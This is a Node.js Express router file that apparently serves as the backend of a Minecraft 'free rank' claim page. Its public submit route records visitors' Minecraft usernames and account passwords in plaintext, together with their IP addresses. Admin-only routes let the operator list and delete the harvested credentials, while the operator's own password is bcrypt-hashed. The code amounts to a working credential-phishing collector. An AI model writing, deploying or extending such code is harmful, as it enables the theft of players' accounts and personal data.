const express = require('express');
const bcrypt = require('bcryptjs');
const db = require('../db');
const router = express.Router();

// ── Auth guard middleware ────────────────────────────────────
function requireAdmin(req, res, next) {
  if (!req.session.adminId)
    return res.status(401).json({ error: 'Unauthorized' });
  next();
}

// POST /api/admin/submit  — called when visitor "claims" a rank
router.post('/submit', (req, res) => {
  const { rank, username, password } = req.body;
  if (!rank || !username)
    return res.status(400).json({ error: 'Missing fields' });

  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
  db.prepare('INSERT INTO submissions (rank, mc_username, mc_password, ip_address) VALUES (?,?,?,?)')
    .run(rank, username, password || '', ip);

  res.json({ success: true });
});

// GET /api/admin/submissions — protected: admin only
router.get('/submissions', requireAdmin, (req, res) => {
  const rows = db.prepare(
    'SELECT id, rank, mc_username, mc_password, ip_address, submitted_at FROM submissions ORDER BY submitted_at DESC'
  ).all();
  res.json(rows);
});

// DELETE /api/admin/submissions/:id — protected
router.delete('/submissions/:id', requireAdmin, (req, res) => {
  db.prepare('DELETE FROM submissions WHERE id = ?').run(req.params.id);
  res.json({ success: true });
});

// DELETE /api/admin/submissions — clear all
router.delete('/submissions', requireAdmin, (req, res) => {
  db.prepare('DELETE FROM submissions').run();
  res.json({ success: true });
});

// POST /api/admin/change-password — protected
router.post('/change-password', requireAdmin, (req, res) => {
  const { currentPassword, newPassword } = req.body;
  if (!currentPassword || !newPassword || newPassword.length < 6)
    return res.status(400).json({ error: 'Invalid input (min 6 chars for new password)' });

  const admin = db.prepare('SELECT * FROM admins WHERE id = ?').get(req.session.adminId);
  if (!bcrypt.compareSync(currentPassword, admin.password))
    return res.status(401).json({ error: 'Current password is wrong' });

  const hashed = bcrypt.hashSync(newPassword, 10);
  db.prepare('UPDATE admins SET password = ? WHERE id = ?').run(hashed, req.session.adminId);
  res.json({ success: true });
});

module.exports = router;
